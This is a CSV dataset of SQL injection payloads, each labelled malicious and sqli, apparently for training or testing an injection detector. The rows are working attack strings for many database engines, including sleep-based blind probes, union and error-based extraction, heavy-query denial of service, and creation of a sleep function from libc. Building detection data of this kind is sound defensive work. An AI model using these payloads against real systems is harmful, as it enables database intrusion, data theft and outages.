payload,label,attack_type
"1 where 2956=2956;select count(*) from generate_series(1,5000000)--",malicious,sqli
1' where 4795=4795 and 4595=4595#,malicious,sqli
"1) as rbmn where 5948=5948 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1) as ooex where 1087=1087 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1' in boolean mode) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
1');begin dbms_lock.sleep(5); end--,malicious,sqli
"1%""))) rlike (select * from (select(sleep(5)))vwyq)#",malicious,sqli
1 and sleep(5)-- ruuv,malicious,sqli
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1%')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('%'='",malicious,sqli
"-1418"") where 7528=7528 order by 1#",malicious,sqli
"1'||(select 'fbsr' where 7899=7899 and elt(4249=4249,7259))||'",malicious,sqli
"1%"";select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,sqli
"1)) union all select null,null,null,null,null,null,null--",malicious,sqli
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('ujjr'='ujjr",malicious,sqli
1'||(select 'xlmt' where 1664=1664;select (case when (1272=5883) then 1272 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
1 where 3802=3802 and 2006=2006,malicious,sqli
"1"") rlike sleep(5)#",malicious,sqli
"1' and make_set(3445=5963,5963) and 'wjfw'='wjfw",malicious,sqli
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('phdn' like 'phdn",malicious,sqli
(2329=4209)*1,malicious,sqli
"1"")) as nsbu where 6569=6569 or sleep(5)#",malicious,sqli
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('cogk'='cogk",malicious,sqli
"1"") as jrse where 9185=9185 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,sqli
"1) where 8338=8338 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,sqli
"1) where 2044=2044 or elt(6272=6272,sleep(5))--",malicious,sqli
1 or sleep(5),malicious,sqli
"1')) as ticp where 9794=9794 union all select null,null,null,null,null,null,null,null--",malicious,sqli
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""umne"" like ""umne",malicious,sqli
"-4934"" union all select 5119,5119,5119,5119,5119--",malicious,sqli
"-4385%')) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",malicious,sqli
1%' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and '%'=',malicious,sqli
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'yhkr'='yhkr",malicious,sqli
"-5573') union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",malicious,sqli
"-7797'+(select oulr where 7091=7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",malicious,sqli
"1) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",malicious,sqli
"1'||(select 'sbft' where 8748=8748;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
"1') as bvvl where 9818=9818 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
"1'))) and elt(1210=1210,sleep(5)) and ((('mbxh' like 'mbxh",malicious,sqli
-6813))) or 6872=6872 and (((7304=7304,malicious,sqli
"-1707) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (7756=7756",malicious,sqli
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('pshn' like 'pshn",malicious,sqli
"1 where 6173=6173;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
"1%""))) and elt(3114=3114,sleep(5))#",malicious,sqli
"1)) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"-7691"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"1"") or (select * from (select(sleep(5)))sddo)#",malicious,sqli
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('iwwa' like 'iwwa",malicious,sqli
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('qbdm'='qbdm",malicious,sqli
"1'+(select zfpk where 9784=9784 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",malicious,sqli
"1');select benchmark(5000000,md5(0x714e4153))#",malicious,sqli
"1%"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""%""=""",malicious,sqli
"1'+(select sxco where 1623=1623 union all select null,null--",malicious,sqli
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'scye' like 'scye",malicious,sqli
1) where 3381=3381;select pg_sleep(5)--,malicious,sqli
1 where 7890=7890 or sleep(5)--,malicious,sqli
"1))) union all select null,null,null,null--",malicious,sqli
"-7950 where 9619=9619 union all select 9619,9619,9619,9619--",malicious,sqli
"1%' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and '%'='",malicious,sqli
1%' and (3020=3020)*6703 and '%'=',malicious,sqli
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('xjvr'='xjvr",malicious,sqli
"1'+(select 'zugq' where 9218=9218;select * from generate_series(7536,7536,case when (7536=7523) then 1 else 0 end) limit 1--",malicious,sqli
"1"") where 5870=5870 union all select null,null,null--",malicious,sqli
1'||(select 'dsjg' where 2402=2402 and 1947=7472--,malicious,sqli
"1 and 8407=(select count(*) from generate_series(1,5000000))-- zozj",malicious,sqli
"1"")) as vigs where 6175=6175 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",malicious,sqli
"1"" where 6686=6686 or elt(6272=6272,sleep(5))--",malicious,sqli
1 union all select null#,malicious,sqli
"1"";select pg_sleep(5)",malicious,sqli
"-4811'))) union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",malicious,sqli
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",malicious,sqli
1') as irck where 3660=3660 or (select * from (select(sleep(5)))ydpu)--,malicious,sqli
-9120')) or 8571=8571--,malicious,sqli
"-2044%')) or elt(9299=3618,3618) and (('%'='",malicious,sqli
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),malicious,sqli
"1"" where 5334=5334 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",malicious,sqli
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",malicious,sqli
1)) as zpvn where 2767=2767 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,malicious,sqli
"1%"")));iif(1217=8831,1,1/0)",malicious,sqli
"1"") and sleep(5) and (""fsuf"" like ""fsuf",malicious,sqli
"1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (5130=5130",malicious,sqli
"-9119"") where 9237=9237 or 8571=8571--",malicious,sqli
"1%"")) union all select null,null,null,null,null,null,null--",malicious,sqli
1)) as wrhe where 6120=6120 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,malicious,sqli
-1485') or (2056=4008)*4008 and ('vphj'='vphj,malicious,sqli
1') rlike sleep(5)#,malicious,sqli
-7199'||(select 'ssty' where 5406=5406 order by 1#,malicious,sqli
"1"") as dien where 4022=4022;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,sqli
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'fvda' like 'fvda",malicious,sqli
"1')) as jvwq where 6596=6596 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'toxr' like 'toxr,malicious,sqli
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""onsd"" like ""onsd",malicious,sqli
"1%';select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
"1')) and elt(1210=1210,sleep(5)) and (('zizo' like 'zizo",malicious,sqli
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",malicious,sqli
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-7126')) as fzpp where 8078=8078 union all select 8078,8078,8078,8078,8078,8078,8078#",malicious,sqli
"1)) or elt(6272=6272,sleep(5)) and ((8024=8024",malicious,sqli
"1%' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1"")) and (7467=7962)*7962 and ((""nhld""=""nhld",malicious,sqli
1%'))) and 7219=7361 and ((('%'=',malicious,sqli
1')) and 6969=(select 6969 from pg_sleep(5)) and (('gjja'='gjja,malicious,sqli
"1'||(select 'kzkr' from dual where 2778=2778;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",malicious,sqli
"1) as ilqx where 8547=8547;select count(*) from generate_series(1,5000000)--",malicious,sqli
"1"" where 9632=9632 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",malicious,sqli
"1"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",malicious,sqli
1)) as dhqt where 8485=8485 waitfor delay '0:0:5'--,malicious,sqli
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'ucpa'='ucpa,malicious,sqli
"1"") and elt(3114=3114,sleep(5))#",malicious,sqli
"1 where 1186=1186 union all select null,null,null,null,null,null,null#",malicious,sqli
1' waitfor delay '0:0:5'--,malicious,sqli
"-8888%') union all select 5312,5312,5312,5312,5312,5312,5312,5312--",malicious,sqli
"1"" and (1668=8054)*8054",malicious,sqli
"1"") where 3393=3393 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",malicious,sqli
1';select (case when (1743=5698) then 1743 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1%""))) rlike (select * from (select(sleep(5)))sgvo) and (((""%""=""",malicious,sqli
"-4822"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""owbp""=""owbp",malicious,sqli
-6712')) as kqff where 9146=9146 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,malicious,sqli
"-9046')) as ymqc where 3733=3733 union all select 3733,3733,3733,3733,3733,3733,3733--",malicious,sqli
1';begin dbms_lock.sleep(5); end,malicious,sqli
"1%"") and make_set(9956=1060,1060) and (""%""=""",malicious,sqli
"1"")) as sdlv where 5922=5922 and 2006=2006",malicious,sqli
1' rlike (select * from (select(sleep(5)))sgvo),malicious,sqli
"1) as ekgx where 9923=9923 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1%"")) or 4240=(select 4240 from pg_sleep(5))--",malicious,sqli
"1"" and 8407=(select count(*) from generate_series(1,5000000))",malicious,sqli
"1) as phja where 4627=4627;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((7700=7700",malicious,sqli
-2165' where 6593=6593 or 9158=7254--,malicious,sqli
"1"" where 1765=1765 union all select null,null,null,null,null,null#",malicious,sqli
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",malicious,sqli
1'+(select 'tmel' where 2655=2655 rlike (select (case when (2118=8500) then 1 else 0x28 end)))+',malicious,sqli
"1"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""lxue"" like ""lxue",malicious,sqli
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""cmhh"" like ""cmhh",malicious,sqli
"1') as khaa where 8157=8157 and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,sqli
"1"")) union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
"1%"" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,sqli
1 rlike sleep(5)#,malicious,sqli
"1'+(select 'bztp' where 2541=2541 union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
1' in boolean mode) or 4240=(select 4240 from pg_sleep(5))--,malicious,sqli
"1"") where 9248=9248;if(6767=5022) select 6767 else drop function buii--",malicious,sqli
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",malicious,sqli
"1 where 3902=3902 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
1') where 6842=6842;begin dbms_lock.sleep(5); end--,malicious,sqli
"-5066')) union all select 9689,9689,9689,9689#",malicious,sqli
"1""));begin dbms_lock.sleep(5); end and ((""dmgj""=""dmgj",malicious,sqli
"1');select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
-6397%' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and '%'=',malicious,sqli
"1') where 6941=6941 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",malicious,sqli
"-5763'))) union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",malicious,sqli
1 where 8393=8393;select (case when (9299=2760) then 1 else 9299*(select 9299 from master..sysdatabases) end)--,malicious,sqli
"1%""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""%""=""",malicious,sqli
"1') where 6387=6387 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1,(select (case when (6857=7623) then 1 else 6857*(select 6857 from information_schema.character_sets) end))",malicious,sqli
